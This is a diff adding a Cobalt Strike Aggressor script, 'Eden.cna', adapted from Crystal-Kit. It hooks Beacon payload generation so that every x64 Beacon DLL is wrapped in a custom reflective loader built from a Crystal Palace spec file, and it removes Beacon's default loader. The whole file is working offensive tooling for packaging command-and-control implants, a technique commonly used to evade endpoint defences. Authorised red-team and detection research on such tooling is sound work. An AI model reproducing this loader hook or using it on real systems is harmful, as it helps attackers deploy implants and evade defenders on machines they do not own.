@@ -1,0 +1,97 @@
+# ------------------------------------
+# CNA Script for Eden.
+# Based on: https://github.com/rasta-mouse/Crystal-Kit/blob/e234f9adafda01b36ec6443e0912a16a1819a980/crystalkit.cna
+# ------------------------------------
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+# ----------------------------------------------
+# Print information to the Script Console
+# $1 = message
+# ----------------------------------------------
+sub print_info {
+   println(formatDate("[HH:mm:ss] ") . "\cE[EDEN]\o " . $1);
+}
+print_info("[+] Eden.cna loaded!");
+
+# ------------------------------------
+# Applies eden ldr to the passed Beacon payload.
+#
+# $1 = Beacon payload file name
+# $2 = Beacon payload (dll binary)
+# $3 = Beacon architecture (x86/x64)
+#
+# returns The Beacon executable payload updated with eden ldr.
+# ------------------------------------
+sub apply_eden_ldr {
+    local('$beacon $arch $file_path $spec $final');
+
+    $beacon = $2;
+    $arch   = $3;
+
+    if ($arch eq "x86") {
+        warn("[!] Eden ldr is x64 only");
+        return $null;
+    }
+
+    # Get path to the Eden spec file
+    $file_path = getFileProper(script_resource(""), "eden.spec");
+
+    # Parse the spec file
+    print_info("Parsing  $+ $file_path $+ ...");
+    $spec = [LinkSpec Parse: $file_path];
+    if (strlen($spec) == 0) {
+        warn("[!] Failed to parse eden.spec");
+        return $null;
+    }
+
+    # Apply the spec / build eden ldr
+    print_info("Applying Eden ldr spec...");
+    $final = [$spec run: $beacon, [new HashMap]];
+    if (strlen($final) == 0) {
+        warn("[!] Failed to build Eden ldr");
+        return $null;
+    }
+    print_info("[+] Eden ldr payload size: " . strlen($final) . " bytes");
+
+    return $final;
+}
+
+# ------------------------------------
+# Set the BEACON_RDLL_GENERATE Hook
+#
+# $1 = Beacon payload file name
+# $2 = Beacon payload (dll binary)
+# $3 = Beacon architecture (x86/x64)
+# $4 = User defined options map provided via the restapi
+#
+# returns The Beacon executable payload updated with eden ldr.
+# ------------------------------------
+set BEACON_RDLL_GENERATE {
+   return apply_eden_ldr($1, $2, $3);
+}
+
+# ------------------------------------
+# Set the BEACON_RDLL_GENERATE_LOCAL Hook
+#
+# $1 = Beacon payload file name
+# $2 = Beacon payload (dll binary)
+# $3 = Beacon architecture (x86/x64)
+# $4 = Parent beacon ID
+# $5 = GetModuleHandleA pointer
+# $6 = GetProcAddress pointer
+# $7 = User defined options map provided via the restapi
+#
+# returns The Beacon executable payload updated with eden ldr.
+# ------------------------------------
+set BEACON_RDLL_GENERATE_LOCAL {
+   # Not using the parent beacon ID, GetModuleHandleA, or GetProcAddress etc.
+   return apply_eden_ldr($1, $2, $3);
+}
+
+# ------------------------------------
+# Remove the reflective loader from the Beacon template (i.e. we just want the Beacon DLL).
+# ------------------------------------
+set BEACON_RDLL_SIZE {
+   return "0";
+}
